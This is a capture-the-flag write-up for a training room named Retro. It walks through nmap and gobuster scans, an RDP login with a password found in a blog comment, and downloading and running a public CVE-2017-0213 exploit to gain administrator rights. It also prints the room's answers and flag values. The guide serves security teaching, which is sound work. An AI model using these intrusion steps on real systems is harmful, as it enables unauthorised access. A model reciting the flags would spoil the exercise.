# [Retro](https://tryhackme.com/r/room/retro)

![Retro](./images/Retro.png)

[Retro](https://tryhackme.com/r/room/retro) is listed as an medium room. New high score! An overview of what we’ll be using is listed here:

* Nmap
* Gobuster
* RDP
* Privilege escalation
* CVE-2017-0213

## Task 1 - Pwn

![logo](./images/logo.png)

Can you time travel? If not, you might want to think about the next best thing.

Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

-------------------------------------

_There are two distinct paths that can be taken on Retro. One requires significantly less trial and error, however, both will work. Please check writeups if you are curious regarding the two paths. An alternative version of this room is available in it's remixed version [Blaster](https://tryhackme.com/room/blaster)_.

### Enumeration & Exploitation

* Scan open port with `nmap`

	```
	nmap $IP -A -p- -oN nmap-scan -Pn
	```

	![nmap](./images/nmap.png)

	We found open port on 80 (HTTP) and 3389 (RDP)

* Scan directory list with `Gobuster`

	```
	gobuster dir -u  $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o gobuster-scan
	```

	![gobuster](./images/gobuster.png)

	We got directory **/retro**

* Browsing into **/retro** directory

	![web1](./images/web1.png)

	We found the author is **Wade** & exploring posts by **Wade**

	![web2](./images/web2.png)

	![web3](./images/web3.png)

	We found suspicious comment on post **Ready Player One**. Take a note for it.

* We know from nmap that host machine has set RDP port open. Connect to it using username Author and password from the comment.

	```
	xfreerdp /v:$IP /u:Wade /p:'parzival'
	```

	![rdp](./images/rdp.png)

	We got initial access

### Privilege Escalation

* View system information on Host machine

	![system](./images/system.png)

	We got information that Host machine run **Windows Server 2016 Build 14393**

* There is a vulnerabolity for this machine

	![vulnerability](./images/vulnerability.png)

* Download file exploit from [Github](https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213)

	```
	wget https://github.com/WindowsExploits/Exploits/raw/master/CVE-2017-0213/Binaries/CVE-2017-0213_x64.zip
	```

	![download](./images/download.png)

* Transfer exploit file to Host machine

	![transfer](./images/transfer.png)

* Extract and run the program

	![run](./images/run.png)

	**WE ARE ROOT NOW**

### Answer the questions below

* A web server is running on the target. What is the hidden directory which the website lives on?

	![directory](./images/directory.png)

	**Answer : /Retro**

* user.txt

	![user](./images/user.png)

	**Answer : 3b99fbdc6d430bfb51c72c651a261927**

* root.txt

	![root](./images/root.png)

	**Answer : 7958b569565d7bd88d10c6f22d1c4063**

